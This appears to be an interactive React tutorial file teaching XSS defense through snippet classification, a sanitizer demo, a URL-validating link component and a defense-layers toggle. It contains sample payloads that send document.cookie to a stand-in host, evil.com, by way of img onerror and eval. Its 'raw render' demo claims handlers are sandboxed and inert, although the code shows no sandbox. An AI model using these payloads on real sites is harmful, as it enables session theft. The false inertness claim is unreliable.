// ============================================================
// Topic:   XSS in React
// Phase:   13 — Tooling, Security & A11y
// File:    tutorial.tsx
//
// Exercise type: CLASSIFY + INTERACTIVE DEMO + BUILD + VISUALIZE
//
// Run: npm run tutorial 04-xss-in-react
// ============================================================

import { useState, useRef, FC } from 'react';

// ─────────────────────────────────────────────────────────────
// EXERCISE 1 — XSS Surface Scanner
//
// Read each code snippet. Classify it as Safe or Vulnerable.
// After revealing, read the explanation for WHY.
// ─────────────────────────────────────────────────────────────

type Safety = 'Safe' | 'Vulnerable' | 'Depends';

interface Snippet {
  id: number;
  label: string;
  code: string;
  answer: Safety;
  explanation: string;
}

const SNIPPETS: Snippet[] = [
  {
    id: 1,
    label: 'JSX text interpolation',
    code: `const userInput = '<script>alert(1)</script>';\nreturn <div>{userInput}</div>;`,
    answer: 'Safe',
    explanation:
      'React uses textContent (not innerHTML) for text nodes. The string is escaped to &lt;script&gt;alert(1)&lt;/script&gt; — the browser renders it as literal text, never as markup.',
  },
  {
    id: 2,
    label: 'dangerouslySetInnerHTML with raw user input',
    code: `return <div dangerouslySetInnerHTML={{ __html: userInput }} />;`,
    answer: 'Vulnerable',
    explanation:
      'dangerouslySetInnerHTML bypasses all React escaping. The string is injected directly as innerHTML. An attacker can supply <img src=x onerror="fetch(attacker+document.cookie)"> and the browser executes it.',
  },
  {
    id: 3,
    label: 'Direct DOM mutation via ref',
    code: `const ref = useRef(null);\nuseEffect(() => {\n  ref.current.innerHTML = userContent;\n}, [userContent]);`,
    answer: 'Vulnerable',
    explanation:
      'ref.current.innerHTML bypasses React entirely — you are writing directly to the DOM. React never sees this content and cannot escape it. Treat it exactly like dangerouslySetInnerHTML: sanitize first.',
  },
  {
    id: 4,
    label: 'Anchor href from user input',
    code: `const userUrl = 'javascript:alert(document.cookie)';\nreturn <a href={userUrl}>Click me</a>;`,
    answer: 'Vulnerable',
    explanation:
      'React (16.9+) emits a warning for javascript: URLs but does NOT block them. The link renders. When a user clicks it, the browser executes the JS. Validate URLs before using them in href — allow only https:// and http://.',
  },
  {
    id: 5,
    label: 'dangerouslySetInnerHTML with DOMPurify',
    code: `import DOMPurify from 'dompurify';\nconst clean = DOMPurify.sanitize(userInput, {\n  ALLOWED_TAGS: ['p','b','i','a'],\n  ALLOWED_ATTR: ['href'],\n});\nreturn <div dangerouslySetInnerHTML={{ __html: clean }} />;`,
    answer: 'Safe',
    explanation:
      'DOMPurify uses the browser\'s own HTML parser to build a DOM tree, removes disallowed nodes, and serialises back to HTML. Because it uses the same parser the browser uses, there\'s no gap between "what the sanitizer saw" and "what the browser renders." This is the correct pattern for rendering rich text.',
  },
  {
    id: 6,
    label: 'img src from user input',
    code: `return <img src={userSrc} alt="User photo" />;`,
    answer: 'Depends',
    explanation:
      'A crafted src cannot directly run JavaScript the way innerHTML can, so this is not a classic XSS vector. However: (1) onerror handlers on <img> are XSS if the src is used in dangerouslySetInnerHTML. (2) The src value could leak referrer info or cause SSRF if it\'s fetched server-side. Validate that the URL is a known origin for images; avoid arbitrary user-supplied URLs.',
  },
  {
    id: 7,
    label: 'eval with user expression',
    code: `const userExpression = "fetch('https://evil.com?c='+document.cookie)";\neval(userExpression);`,
    answer: 'Vulnerable',
    explanation:
      'eval() executes any JavaScript string with full page privileges. This is the most direct XSS vector possible. Never call eval(), new Function(), or setTimeout/setInterval with string arguments on user-supplied input. CSP with no \'unsafe-eval\' blocks this as a second line of defense.',
  },
  {
    id: 8,
    label: 'Inline style from user value',
    code: `return <p style={{ color: userColor }}>Hello</p>;`,
    answer: 'Depends',
    explanation:
      'React accepts style as a JS object — it sets individual CSS properties via the DOM style API, not via innerHTML. Pure CSS injection (changing color, layout) is a UI defacement issue, not script execution. However, if the style value were ever interpolated into a style *tag* string (dangerouslySetInnerHTML), it could enable CSS-injection attacks. In the object form shown here, XSS is not possible.',
  },
];

type GuessMap = Record<number, { guess: Safety | null; revealed: boolean }>;

const SAFETY_COLORS: Record<Safety, string> = {
  Safe: '#27ae60',
  Vulnerable: '#c0392b',
  Depends: '#e67e22',
};

function SnippetCard({ snippet, state, onGuess, onReveal }: {
  snippet: Snippet;
  state: { guess: Safety | null; revealed: boolean };
  onGuess: (s: Safety) => void;
  onReveal: () => void;
}) {
  const isCorrect = state.guess === snippet.answer;

  return (
    <div style={{
      border: '1px solid #ddd',
      borderRadius: '10px',
      overflow: 'hidden',
      background: state.revealed ? (isCorrect ? '#f0fff4' : '#fff8f0') : '#fff',
      transition: 'background 0.3s',
    }}>
      <div style={{ padding: '0.75rem 1.25rem', borderBottom: '1px solid #eee', background: '#fafafa', display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
        <strong>#{snippet.id}</strong>
        <span style={{ color: '#555', fontSize: '0.9rem' }}>{snippet.label}</span>
      </div>
      <pre style={{ margin: 0, padding: '1rem 1.25rem', background: '#1e1e1e', color: '#d4d4d4', fontSize: '0.82rem', lineHeight: 1.6, overflowX: 'auto', whiteSpace: 'pre-wrap' }}>
        {snippet.code}
      </pre>
      <div style={{ padding: '0.75rem 1.25rem' }}>
        {!state.revealed && (
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', flexWrap: 'wrap' }}>
            {(['Safe', 'Vulnerable', 'Depends'] as Safety[]).map(s => (
              <button
                key={s}
                onClick={() => onGuess(s)}
                style={{
                  padding: '0.35rem 1rem',
                  borderRadius: '6px',
                  border: '2px solid',
                  borderColor: state.guess === s ? SAFETY_COLORS[s] : '#ddd',
                  background: state.guess === s ? SAFETY_COLORS[s] : '#fff',
                  color: state.guess === s ? '#fff' : '#333',
                  cursor: 'pointer',
                  fontWeight: state.guess === s ? 700 : 400,
                  fontSize: '0.85rem',
                  transition: 'all 0.15s',
                }}
              >
                {s}
              </button>
            ))}
            {state.guess && (
              <button
                onClick={onReveal}
                style={{ padding: '0.35rem 1rem', borderRadius: '6px', border: '2px solid #333', background: '#333', color: '#fff', cursor: 'pointer', fontSize: '0.85rem', marginLeft: 'auto' }}
              >
                Reveal →
              </button>
            )}
          </div>
        )}
        {state.revealed && (
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '0.5rem' }}>
              <span style={{ padding: '0.25rem 0.85rem', borderRadius: '20px', background: SAFETY_COLORS[snippet.answer], color: '#fff', fontWeight: 700, fontSize: '0.82rem' }}>
                {snippet.answer}
              </span>
              <span style={{ fontSize: '0.9rem' }}>
                {isCorrect ? '✓ Correct' : `✗ You picked ${state.guess} — answer: ${snippet.answer}`}
              </span>
            </div>
            <p style={{ margin: 0, fontSize: '0.85rem', color: '#444', lineHeight: 1.65 }}>{snippet.explanation}</p>
          </div>
        )}
      </div>
    </div>
  );
}

const Exercise1_XSSSurfaceScanner: FC = () => {
  const [states, setStates] = useState<GuessMap>(() =>
    Object.fromEntries(SNIPPETS.map(s => [s.id, { guess: null, revealed: false }]))
  );
  const score = SNIPPETS.filter(s => states[s.id].revealed && states[s.id].guess === s.answer).length;
  const totalRevealed = SNIPPETS.filter(s => states[s.id].revealed).length;

  return (
    <section>
      <h2>Exercise 1: XSS Surface Scanner — Safe vs Vulnerable</h2>
      <p style={{ color: '#555', fontSize: '0.9rem' }}>
        Read each code snippet. Choose Safe, Vulnerable, or Depends. Then reveal the answer and explanation.
        Think before clicking — the reasoning is the point.
      </p>
      {totalRevealed > 0 && (
        <div style={{ margin: '0.5rem 0 1rem', padding: '0.5rem 1rem', background: '#e8f5e9', borderRadius: '6px', fontSize: '0.85rem' }}>
          Score: <strong>{score}/{totalRevealed}</strong> revealed so far
        </div>
      )}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
        {SNIPPETS.map(s => (
          <SnippetCard
            key={s.id}
            snippet={s}
            state={states[s.id]}
            onGuess={guess => setStates(prev => ({ ...prev, [s.id]: { ...prev[s.id], guess } }))}
            onReveal={() => setStates(prev => ({ ...prev, [s.id]: { ...prev[s.id], revealed: true } }))}
          />
        ))}
      </div>
    </section>
  );
};

// ─────────────────────────────────────────────────────────────
// EXERCISE 2 — DOMPurify Sanitizer Live Demo
//
// Type raw HTML. See what a simplified sanitizer strips.
// Toggle the "unsanitized" view to understand the risk.
//
// Note: We implement a simplified demo sanitizer here.
// Real DOMPurify uses the DOM parser (not regex) — it handles
// far more edge cases. This demo illustrates the concept only.
// ─────────────────────────────────────────────────────────────

// Simplified demo sanitizer — strips the most obvious attack vectors.
// NOT production-safe. Real apps should use DOMPurify.
function demoSanitize(html: string): { sanitized: string; stripped: string[] } {
  const stripped: string[] = [];

  let result = html;

  // Strip <script> blocks
  result = result.replace(/<script[\s\S]*?<\/script>/gi, (match) => {
    stripped.push(match.slice(0, 60) + (match.length > 60 ? '...' : ''));
    return '';
  });

  // Strip javascript: hrefs and src values
  result = result.replace(/(href|src)=["']javascript:[^"']*["']/gi, (match) => {
    stripped.push(match);
    return '';
  });

  // Strip on* event handlers (onerror, onclick, onload, etc.)
  result = result.replace(/\s+on\w+\s*=\s*["'][^"']*["']/gi, (match) => {
    stripped.push(match.trim());
    return '';
  });

  // Strip data: URIs in src/href (potential XSS vector)
  result = result.replace(/(href|src)=["']data:[^"']*["']/gi, (match) => {
    stripped.push(match);
    return '';
  });

  return { sanitized: result, stripped };
}

const DEMO_PAYLOADS = [
  { label: 'Bold text (safe)', value: '<b>Hello</b> <i>world</i>' },
  { label: 'img onerror XSS', value: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">' },
  { label: 'script tag', value: '<p>Visit us!</p><script>alert(document.cookie)</script>' },
  { label: 'javascript: href', value: '<a href="javascript:alert(1)">Click me</a>' },
  { label: 'data: URI', value: '<a href="data:text/html,<script>alert(1)</script>">XSS via data URI</a>' },
  { label: 'Normal link', value: '<a href="https://example.com">Safe link</a>' },
];

const Exercise2_SanitizerDemo: FC = () => {
  const [input, setInput] = useState('<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">');
  const [showUnsanitized, setShowUnsanitized] = useState(false);
  const { sanitized, stripped } = demoSanitize(input);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  return (
    <section>
      <h2>Exercise 2: DOMPurify Sanitizer — Live Demo</h2>
      <p style={{ color: '#555', fontSize: '0.9rem' }}>
        Type HTML below (or pick a preset). See what the sanitizer strips and what renders safely.
        Toggle "Show unsanitized path" to understand the risk of skipping sanitization.
      </p>

      <div style={{ background: '#fff3cd', border: '1px solid #ffc107', borderRadius: '6px', padding: '0.75rem 1rem', marginBottom: '1rem', fontSize: '0.8rem', color: '#856404' }}>
        <strong>Note:</strong> This demo uses a simplified regex-based sanitizer for illustration.
        Real production code must use <strong>DOMPurify</strong>, which uses the browser's actual HTML
        parser — it handles encoding tricks and parsing quirks that regex cannot.
      </div>

      {/* Presets */}
      <div style={{ display: 'flex', gap: '0.4rem', flexWrap: 'wrap', marginBottom: '0.75rem' }}>
        {DEMO_PAYLOADS.map(p => (
          <button
            key={p.label}
            onClick={() => setInput(p.value)}
            style={{ padding: '0.3rem 0.75rem', borderRadius: '5px', border: '1px solid #ddd', background: '#f5f5f5', cursor: 'pointer', fontSize: '0.78rem' }}
          >
            {p.label}
          </button>
        ))}
      </div>

      <textarea
        value={input}
        onChange={e => setInput(e.target.value)}
        rows={3}
        style={{ width: '100%', fontFamily: 'monospace', fontSize: '0.85rem', padding: '0.6rem', borderRadius: '6px', border: '1px solid #ddd', boxSizing: 'border-box', resize: 'vertical' }}
        placeholder="Type HTML here..."
      />

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginTop: '1rem' }}>
        {/* What was stripped */}
        <div style={{ background: '#fff8f0', border: '1px solid #f5cba7', borderRadius: '8px', padding: '1rem' }}>
          <div style={{ fontWeight: 700, fontSize: '0.85rem', color: '#c0392b', marginBottom: '0.5rem' }}>
            Stripped by sanitizer ({stripped.length} item{stripped.length !== 1 ? 's' : ''})
          </div>
          {stripped.length === 0 ? (
            <p style={{ margin: 0, color: '#888', fontSize: '0.82rem' }}>Nothing stripped — input looks clean.</p>
          ) : (
            <ul style={{ margin: 0, padding: '0 0 0 1.2rem', fontSize: '0.8rem', color: '#c0392b', lineHeight: 1.7 }}>
              {stripped.map((s, i) => <li key={i}><code>{s}</code></li>)}
            </ul>
          )}
        </div>

        {/* Safe render */}
        <div style={{ background: '#f0fff4', border: '1px solid #a9dfbf', borderRadius: '8px', padding: '1rem' }}>
          <div style={{ fontWeight: 700, fontSize: '0.85rem', color: '#27ae60', marginBottom: '0.5rem' }}>
            Safe render (sanitized)
          </div>
          <div
            style={{ fontSize: '0.9rem', color: '#333', lineHeight: 1.6 }}
            dangerouslySetInnerHTML={{ __html: sanitized }}
          />
          <div style={{ marginTop: '0.75rem', paddingTop: '0.5rem', borderTop: '1px solid #a9dfbf', fontSize: '0.75rem', color: '#888' }}>
            Sanitized HTML: <code>{sanitized || '(empty)'}</code>
          </div>
        </div>
      </div>

      {/* Unsanitized toggle */}
      <div style={{ marginTop: '1rem', border: '2px solid #c0392b', borderRadius: '8px', overflow: 'hidden' }}>
        <button
          onClick={() => setShowUnsanitized(v => !v)}
          style={{ width: '100%', padding: '0.6rem 1rem', background: showUnsanitized ? '#c0392b' : '#fff', color: showUnsanitized ? '#fff' : '#c0392b', border: 'none', cursor: 'pointer', fontWeight: 700, fontSize: '0.85rem', textAlign: 'left' }}
        >
          {showUnsanitized ? '▲ Hide' : '▼ Show'} "What if we didn't sanitize?" (renders raw input)
        </button>
        {showUnsanitized && (
          <div style={{ padding: '1rem', background: '#fff5f5' }}>
            <p style={{ margin: '0 0 0.5rem', fontSize: '0.8rem', color: '#c0392b', fontWeight: 600 }}>
              RAW render — this is what happens without sanitization:
            </p>
            <div
              style={{ border: '1px dashed #c0392b', padding: '0.75rem', borderRadius: '4px', fontSize: '0.9rem' }}
              dangerouslySetInnerHTML={{ __html: input }}
            />
            <p style={{ margin: '0.5rem 0 0', fontSize: '0.75rem', color: '#888' }}>
              (Event handlers in this sandbox are intentionally inert — in a real app, onerror and onclick would fire.)
            </p>
          </div>
        )}
      </div>

      <div style={{ background: '#fffde7', padding: '1rem', borderRadius: '8px', marginTop: '1rem', fontSize: '0.85rem' }}>
        <strong>Reflection:</strong>
        <ol style={{ margin: '0.5rem 0 0', lineHeight: 2.2 }}>
          <li>Try the "img onerror XSS" preset. What does the sanitizer remove? What remains?</li>
          <li>Why does real DOMPurify use the DOM parser instead of regex? (Think: what does the browser do with <code>&lt;img/&gt;&lt;script&gt;</code> vs what regex would parse?)</li>
          <li>If you use DOMPurify with an empty allowlist (<code>ALLOWED_TAGS: []</code>), what happens to all HTML? Is that ever useful?</li>
        </ol>
      </div>
    </section>
  );
};

// ─────────────────────────────────────────────────────────────
// EXERCISE 3 — Build the SafeLink Component
//
// A link component that validates URLs before rendering.
// Blocks javascript: and data: protocols.
// See the vulnerable version, then the fixed version, then test.
// ─────────────────────────────────────────────────────────────

// Vulnerable version — no protocol validation
function VulnerableLink({ href, children }: { href: string; children: React.ReactNode }) {
  return <a href={href} style={{ color: '#c0392b' }}>{children}</a>;
}

// Fixed version — validates protocol before rendering
function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  const ALLOWED_PROTOCOLS = ['https:', 'http:', 'mailto:'];
  let isSafe = false;
  try {
    const url = new URL(href, window.location.href);
    isSafe = ALLOWED_PROTOCOLS.includes(url.protocol);
  } catch {
    // Relative paths are fine — no protocol to reject
    isSafe = !href.startsWith('javascript:') && !href.startsWith('data:');
  }

  if (!isSafe) {
    return (
      <span
        title={`Blocked unsafe URL: ${href}`}
        style={{ color: '#888', textDecoration: 'line-through', cursor: 'not-allowed' }}
      >
        {children} [blocked: unsafe protocol]
      </span>
    );
  }
  return <a href={href} rel="noopener noreferrer" style={{ color: '#27ae60' }}>{children}</a>;
}

const TEST_URLS = [
  { label: 'Safe HTTPS', url: 'https://example.com' },
  { label: 'Safe relative', url: '/about' },
  { label: 'javascript: XSS', url: 'javascript:alert(document.cookie)' },
  { label: 'data: XSS', url: 'data:text/html,<script>alert(1)</script>' },
  { label: 'JAVASCRIPT: uppercase bypass', url: 'JAVASCRIPT:alert(1)' },
  { label: 'Mailto link', url: 'mailto:user@example.com' },
];

const Exercise3_SafeLinkComponent: FC = () => {
  const [customUrl, setCustomUrl] = useState('javascript:alert(document.cookie)');
  const [selected, setSelected] = useState<string | null>(null);

  const activeUrl = selected ?? customUrl;

  return (
    <section>
      <h2>Exercise 3: Build the SafeLink Component</h2>
      <p style={{ color: '#555', fontSize: '0.9rem' }}>
        A <code>SafeLink</code> validates URLs and blocks <code>javascript:</code> and <code>data:</code> protocols
        before rendering an anchor tag. See how the vulnerable version differs from the safe one.
      </p>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5rem', marginBottom: '1.5rem' }}>
        {/* Vulnerable */}
        <div style={{ border: '2px solid #c0392b', borderRadius: '8px', padding: '1rem' }}>
          <div style={{ fontWeight: 700, color: '#c0392b', marginBottom: '0.75rem', fontSize: '0.9rem' }}>
            VulnerableLink (no validation)
          </div>
          <pre style={{ margin: '0 0 0.75rem', background: '#1e1e1e', color: '#f88', padding: '0.75rem', borderRadius: '5px', fontSize: '0.77rem', whiteSpace: 'pre-wrap', overflowX: 'auto' }}>{`function VulnerableLink({ href, children }) {
  // No validation — renders whatever href is given
  return <a href={href}>{children}</a>;
}`}</pre>
          <div style={{ fontSize: '0.85rem' }}>
            Renders: <VulnerableLink href={activeUrl}>Click here</VulnerableLink>
          </div>
          <p style={{ margin: '0.5rem 0 0', fontSize: '0.75rem', color: '#c0392b' }}>
            {activeUrl.match(/^(javascript:|data:)/i) ? '⚠ This link will execute JS on click!' : 'This URL looks benign.'}
          </p>
        </div>

        {/* Safe */}
        <div style={{ border: '2px solid #27ae60', borderRadius: '8px', padding: '1rem' }}>
          <div style={{ fontWeight: 700, color: '#27ae60', marginBottom: '0.75rem', fontSize: '0.9rem' }}>
            SafeLink (protocol validated)
          </div>
          <pre style={{ margin: '0 0 0.75rem', background: '#1e1e1e', color: '#9f9', padding: '0.75rem', borderRadius: '5px', fontSize: '0.77rem', whiteSpace: 'pre-wrap', overflowX: 'auto' }}>{`function SafeLink({ href, children }) {
  const allowed = ['https:', 'http:', 'mailto:'];
  const url = new URL(href, window.location.href);
  if (!allowed.includes(url.protocol)) {
    return <span>[blocked: unsafe protocol]</span>;
  }
  return (
    <a href={href} rel="noopener noreferrer">
      {children}
    </a>
  );
}`}</pre>
          <div style={{ fontSize: '0.85rem' }}>
            Renders: <SafeLink href={activeUrl}>Click here</SafeLink>
          </div>
        </div>
      </div>

      {/* URL tester */}
      <div style={{ background: '#fafafa', border: '1px solid #ddd', borderRadius: '8px', padding: '1rem' }}>
        <div style={{ fontWeight: 600, marginBottom: '0.6rem', fontSize: '0.9rem' }}>Test with different URLs:</div>
        <div style={{ display: 'flex', gap: '0.4rem', flexWrap: 'wrap', marginBottom: '0.75rem' }}>
          {TEST_URLS.map(t => (
            <button
              key={t.url}
              onClick={() => { setSelected(t.url); setCustomUrl(t.url); }}
              style={{
                padding: '0.3rem 0.75rem',
                borderRadius: '5px',
                border: '1px solid',
                borderColor: activeUrl === t.url ? '#1a73e8' : '#ddd',
                background: activeUrl === t.url ? '#e8f0fe' : '#fff',
                cursor: 'pointer',
                fontSize: '0.78rem',
              }}
            >
              {t.label}
            </button>
          ))}
        </div>
        <div style={{ display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
          <input
            type="text"
            value={customUrl}
            onChange={e => { setCustomUrl(e.target.value); setSelected(null); }}
            style={{ flex: 1, fontFamily: 'monospace', fontSize: '0.85rem', padding: '0.4rem 0.6rem', borderRadius: '5px', border: '1px solid #ddd' }}
            placeholder="Type a URL to test..."
          />
        </div>
      </div>

      <div style={{ background: '#fffde7', padding: '1rem', borderRadius: '8px', marginTop: '1rem', fontSize: '0.85rem' }}>
        <strong>Reflection:</strong>
        <ol style={{ margin: '0.5rem 0 0', lineHeight: 2.2 }}>
          <li>Try "JAVASCRIPT: uppercase bypass" — does the safe version handle it? Why? (Hint: <code>new URL()</code> normalizes the protocol.)</li>
          <li>Why does React emit a warning for <code>javascript:</code> hrefs but not block them? What does this tell you about React's security model?</li>
          <li>Should SafeLink use <code>rel="noopener noreferrer"</code> on all external links? What does <code>window.opener</code> expose?</li>
        </ol>
      </div>
    </section>
  );
};

// ─────────────────────────────────────────────────────────────
// EXERCISE 4 — Defense Layers Visualizer
//
// Toggle React escaping, DOMPurify sanitization, and CSP on/off.
// See which attacks succeed against each combination.
// Key insight: CSP is defense-in-depth, not the primary layer.
// ─────────────────────────────────────────────────────────────

interface Attack {
  name: string;
  description: string;
  blockedBy: Array<'react' | 'sanitize' | 'csp'>;
  requiresAny?: Array<'react' | 'sanitize' | 'csp'>;
}

const ATTACKS: Attack[] = [
  {
    name: '<script> tag injection via dangerouslySetInnerHTML',
    description: 'Attacker injects a <script> tag through a rich text field.',
    blockedBy: ['sanitize', 'csp'],
  },
  {
    name: 'JSX text interpolation: <script>alert(1)</script>',
    description: 'Attacker sends a script tag as a normal text value rendered via {value}.',
    blockedBy: ['react'],
  },
  {
    name: 'img onerror exfiltration via innerHTML',
    description: 'Attacker puts an onerror handler in HTML rendered via dangerouslySetInnerHTML or ref.current.innerHTML.',
    blockedBy: ['sanitize', 'csp'],
  },
  {
    name: 'javascript: URL in anchor href',
    description: 'Attacker sets href to javascript:fetch(attacker+document.cookie).',
    blockedBy: ['csp'],
    requiresAny: ['sanitize'],
  },
  {
    name: 'eval() with user-supplied string',
    description: 'Developer mistakenly calls eval() on a user-controlled value.',
    blockedBy: ['csp'],
  },
];

type DefenseState = { react: boolean; sanitize: boolean; csp: boolean };

const DEFENSE_COLORS = { react: '#1a73e8', sanitize: '#27ae60', csp: '#8e44ad' };
const DEFENSE_LABELS = { react: 'React JSX Escaping', sanitize: 'DOMPurify Sanitization', csp: 'Content Security Policy' };

function isAttackBlocked(attack: Attack, defenses: DefenseState): boolean {
  return attack.blockedBy.some(d => defenses[d]);
}

const Exercise4_DefenseLayers: FC = () => {
  const [defenses, setDefenses] = useState<DefenseState>({ react: true, sanitize: false, csp: false });

  const toggle = (key: keyof DefenseState) =>
    setDefenses(prev => ({ ...prev, [key]: !prev[key] }));

  const blockedCount = ATTACKS.filter(a => isAttackBlocked(a, defenses)).length;

  return (
    <section>
      <h2>Exercise 4: Defense Layers — Toggle to See What Each Blocks</h2>
      <p style={{ color: '#555', fontSize: '0.9rem' }}>
        Toggle defenses on and off. See which attack vectors each layer blocks.
        The goal is to understand why CSP is a backup — not the primary defense.
      </p>

      {/* Defense toggles */}
      <div style={{ display: 'flex', gap: '1rem', flexWrap: 'wrap', marginBottom: '1.5rem' }}>
        {(Object.keys(defenses) as Array<keyof DefenseState>).map(key => (
          <button
            key={key}
            onClick={() => toggle(key)}
            style={{
              padding: '0.5rem 1.25rem',
              borderRadius: '8px',
              border: '2px solid',
              borderColor: DEFENSE_COLORS[key],
              background: defenses[key] ? DEFENSE_COLORS[key] : '#fff',
              color: defenses[key] ? '#fff' : DEFENSE_COLORS[key],
              cursor: 'pointer',
              fontWeight: 700,
              fontSize: '0.88rem',
              transition: 'all 0.15s',
            }}
          >
            {defenses[key] ? '✓' : '○'} {DEFENSE_LABELS[key]}
          </button>
        ))}
      </div>

      {/* Score */}
      <div style={{ margin: '0 0 1rem', padding: '0.5rem 1rem', background: blockedCount === ATTACKS.length ? '#e8f5e9' : blockedCount === 0 ? '#fff5f5' : '#fff8e1', borderRadius: '6px', fontSize: '0.88rem', fontWeight: 600 }}>
        {blockedCount}/{ATTACKS.length} attack vectors blocked
        {blockedCount === ATTACKS.length && ' — All covered!'}
        {blockedCount === 0 && ' — No defenses active — all attacks succeed!'}
      </div>

      {/* Attack matrix */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '0.6rem' }}>
        {ATTACKS.map((attack, i) => {
          const blocked = isAttackBlocked(attack, defenses);
          return (
            <div
              key={i}
              style={{
                border: '1px solid',
                borderColor: blocked ? '#a9dfbf' : '#f5b7b1',
                borderRadius: '8px',
                padding: '0.75rem 1rem',
                background: blocked ? '#f0fff4' : '#fff5f5',
                transition: 'all 0.2s',
              }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: '1rem' }}>
                <div style={{ flex: 1 }}>
                  <div style={{ fontWeight: 600, fontSize: '0.88rem', color: '#333' }}>{attack.name}</div>
                  <div style={{ fontSize: '0.8rem', color: '#666', marginTop: '0.25rem' }}>{attack.description}</div>
                </div>
                <span style={{
                  padding: '0.2rem 0.75rem',
                  borderRadius: '20px',
                  fontSize: '0.78rem',
                  fontWeight: 700,
                  whiteSpace: 'nowrap',
                  background: blocked ? '#27ae60' : '#c0392b',
                  color: '#fff',
                }}>
                  {blocked ? 'BLOCKED' : 'SUCCEEDS'}
                </span>
              </div>
              <div style={{ display: 'flex', gap: '0.4rem', marginTop: '0.5rem', flexWrap: 'wrap' }}>
                {attack.blockedBy.map(d => (
                  <span
                    key={d}
                    style={{
                      padding: '0.15rem 0.5rem',
                      borderRadius: '4px',
                      fontSize: '0.72rem',
                      background: defenses[d] ? DEFENSE_COLORS[d] : '#eee',
                      color: defenses[d] ? '#fff' : '#999',
                      transition: 'all 0.2s',
                    }}
                  >
                    {DEFENSE_LABELS[d]}
                  </span>
                ))}
              </div>
            </div>
          );
        })}
      </div>

      <div style={{ background: '#e8f5e9', padding: '1rem', borderRadius: '8px', marginTop: '1.5rem', fontSize: '0.85rem' }}>
        <strong>Key insight:</strong> React escaping alone blocks XSS from normal JSX interpolation — which covers
        95% of your surface area. DOMPurify is required when you intentionally render HTML (rich text, CMS content).
        CSP is a last-resort safety net: it limits damage if an attacker somehow bypasses sanitization. You need
        all three layers for robust defense-in-depth, but they are not equal — React is primary, sanitization
        is secondary, CSP is tertiary.
      </div>

      <div style={{ background: '#fffde7', padding: '1rem', borderRadius: '8px', marginTop: '1rem', fontSize: '0.85rem' }}>
        <strong>Reflection:</strong>
        <ol style={{ margin: '0.5rem 0 0', lineHeight: 2.2 }}>
          <li>Turn ON only CSP. Which attacks does it block? Which slip through? Why?</li>
          <li>Turn ON only DOMPurify. Why does the "JSX text interpolation" attack still get blocked (even though DOMPurify isn't active)? Where is the hidden defense?</li>
          <li>An interviewer asks: "Can you rely on CSP alone to prevent XSS?" What do you say?</li>
        </ol>
      </div>
    </section>
  );
};

// ─── App ─────────────────────────────────────────────────────
const App: FC = () => (
  <div style={{ fontFamily: 'system-ui', padding: '2rem', maxWidth: '900px', margin: '0 auto' }}>
    <h1>XSS in React</h1>
    <div style={{ background: '#e3f2fd', padding: '1rem', borderRadius: '8px', marginBottom: '2rem', fontSize: '0.9rem' }}>
      <strong>Topic:</strong> How React protects against XSS by default, where those protections break down
      (<code>dangerouslySetInnerHTML</code>, <code>javascript:</code> URLs, direct DOM mutation), and how to
      sanitize correctly with DOMPurify. Understand the three defense layers and why CSP is defense-in-depth,
      not a substitute for sanitization.
    </div>
    <div style={{ display: 'flex', flexDirection: 'column', gap: '3rem' }}>
      <Exercise1_XSSSurfaceScanner />
      <hr />
      <Exercise2_SanitizerDemo />
      <hr />
      <Exercise3_SafeLinkComponent />
      <hr />
      <Exercise4_DefenseLayers />
    </div>
  </div>
);

export default App;
